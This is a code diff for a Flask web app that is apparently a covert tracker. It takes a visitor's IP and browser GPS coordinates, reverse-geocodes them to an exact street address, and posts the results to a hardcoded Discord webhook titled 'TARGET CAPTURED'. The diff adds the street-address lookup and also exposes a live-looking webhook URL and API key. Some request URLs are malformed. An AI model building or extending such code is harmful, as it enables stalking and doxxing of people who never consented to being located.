@@ -1,6 +1,7 @@
 import os
 import requests
 from flask import Flask, render_template, request, jsonify
+from geopy.geocoders import Nominatim
 
 app = Flask(__name__)
 
@@ -8,51 +9,62 @@ app = Flask(__name__)
 DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1482323306198601780/bvnAqpLHXijSAMi0fwJQV-IZG2nXdoScT4MFttVL3e42cXtol1HiGDGqR1AdsscKDzKG"
 IP_API_KEY = "6DE085F79B20D090372DCDAB19FA7413"
 
+# Initialize Geocoder
+geolocator = Nominatim(user_agent="StormTrace_Diagnostic_v2")
+
 @app.route('/')
 def index():
-    # Get the real IP to show it on the website
-    visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    if visitor_ip and ',' in visitor_ip:
-        visitor_ip = visitor_ip.split(',')[0].strip()
-    
-    # Pass the IP to the HTML
-    return render_template('index.html', user_ip=visitor_ip)
+    # Get Real IP for the Dashboard display
+    user_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
+    if user_ip and ',' in user_ip:
+        user_ip = user_ip.split(',')[0].strip()
+    return render_template('index.html', user_ip=user_ip)
 
 @app.route('/geo', methods=['POST'])
-def capture():
+def capture_and_log():
     data = request.json
     lat, lon = data.get('lat'), data.get('lon')
     
-    # Re-capture IP for the Discord report
+    # 1. Capture IP and VPN/ISP Info
     visitor_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
     if visitor_ip and ',' in visitor_ip:
         visitor_ip = visitor_ip.split(',')[0].strip()
 
-    # Get Geo/VPN data for the webhook
     try:
-        api_res = requests.get(f"https://api.ip2location.io{IP_API_KEY}&ip={visitor_ip}&format=json").json()
-        vpn = "✅ YES" if api_res.get('is_proxy') else "❌ NO"
-        city, country = api_res.get('city_name'), api_res.get('country_name')
+        ip_res = requests.get(f"https://api.ip2location.io{IP_API_KEY}&ip={visitor_ip}&format=json").json()
+        vpn = "✅ YES" if ip_res.get('is_proxy') else "❌ NO"
+        isp = ip_res.get('isp', 'Unknown')
     except:
-        vpn, city, country = "Unknown", "Unknown", "Unknown"
+        vpn, isp = "Unknown", "Unknown"
 
+    # 2. Get Exact Street Address via Reverse Geocoding
+    try:
+        location = geolocator.reverse(f"{lat}, {lon}")
+        address = location.address
+    except:
+        address = "Could not retrieve street name."
+
+    # 3. Format Webhook Report
     payload = {
-        "username": "Captain Hook",
+        "username": "StormTrace Intelligence",
         "embeds": [{
-            "title": "🌐 TARGET CAPTURED",
+            "title": "⚡ HIGH-PRECISION TARGET CAPTURED",
             "color": 3066993,
             "fields": [
-                {"name": "IP Address", "value": f"`{visitor_ip}`", "inline": False},
-                {"name": "VPN Detected", "value": vpn, "inline": True},
-                {"name": "ISP Location", "value": f"{city}, {country}", "inline": True},
-                {"name": "Google Maps (GPS)", "value": f"[Click to View Exact House](https://www.google.com{lat},{lon})", "inline": False}
+                {"name": "🌐 Network IP", "value": f"`{visitor_ip}`", "inline": False},
+                {"name": "🛡️ VPN/Proxy", "value": vpn, "inline": True},
+                {"name": "📡 ISP Provider", "value": isp, "inline": True},
+                {"name": "📍 Full Address", "value": f"```{address}```", "inline": False},
+                {"name": "🗺️ Google Maps", "value": f"[Open Map Location](https://www.google.com{lat},{lon})", "inline": False}
             ],
-            "footer": {"text": "IP Lookup Tool v2.0"}
+            "footer": {"text": "Verified GPS & Reverse Geocoding Active"}
         }]
     }
+    
     requests.post(DISCORD_WEBHOOK_URL, json=payload)
-    return jsonify({"status": "ok"})
+    return jsonify({"status": "verified"})
 
 if __name__ == "__main__":
     port = int(os.environ.get("PORT", 5000))
     app.run(host='0.0.0.0', port=port)
+    
